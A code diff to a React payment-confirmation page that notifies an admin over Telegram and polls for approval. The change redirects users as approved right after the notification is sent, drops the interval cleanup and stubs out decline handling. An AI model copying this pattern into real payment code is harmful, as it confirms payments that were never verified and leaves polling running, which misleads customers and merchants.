@@ -25,7 +25,7 @@ const PushConfirmationPage = () => {
       setTimeWaiting(prev => Math.max(0, prev - 1)); // Count down to 0
     }, 1000);
 
-    // Poll for admin response every 3 seconds, but only when waiting for confirmation
+    // Poll for admin response every 3 seconds
     const pollTimer = setInterval(async () => {
       if (isConfirming) {
         try {
@@ -36,16 +36,14 @@ const PushConfirmationPage = () => {
             .maybeSingle();
           
           if (session?.payment_status === 'approved') {
-            clearInterval(pollTimer);
             handleApprovalReceived();
           } else if (session?.payment_status === 'declined' || session?.admin_response === 'error') {
-            clearInterval(pollTimer);
+            // Handle error case
             setIsConfirming(false);
-            // Show error message to user
-            console.log('Payment was declined by admin');
+            // Could show error message here
           }
         } catch (error) {
-          console.error('Error checking admin response:', error);
+          console.error('Error checking status:', error);
         }
       }
     }, 3000);
@@ -110,8 +108,9 @@ const PushConfirmationPage = () => {
         return;
       }
       
-      console.log('Telegram notification sent successfully, waiting for admin response...');
-      // Keep isConfirming=true and wait for admin response via polling
+      console.log('Telegram notification sent successfully');
+      // Automatically redirect after sending notification
+      handleApprovalReceived();
     } catch (error) {
       console.error('Error sending notification:', error);
       setIsConfirming(false);
@@ -205,7 +204,7 @@ const PushConfirmationPage = () => {
 
                   <div className="text-center space-y-4 pt-4 border-t border-border">
                     <p className="text-sm text-muted-foreground">
-                      {isConfirming ? 'Waiting for admin approval...' : 'Click below to confirm your payment'}
+                      {isConfirming ? 'Sending notification...' : 'Click below to confirm your payment'}
                     </p>
                     <Button 
                       onClick={handleManualConfirm}
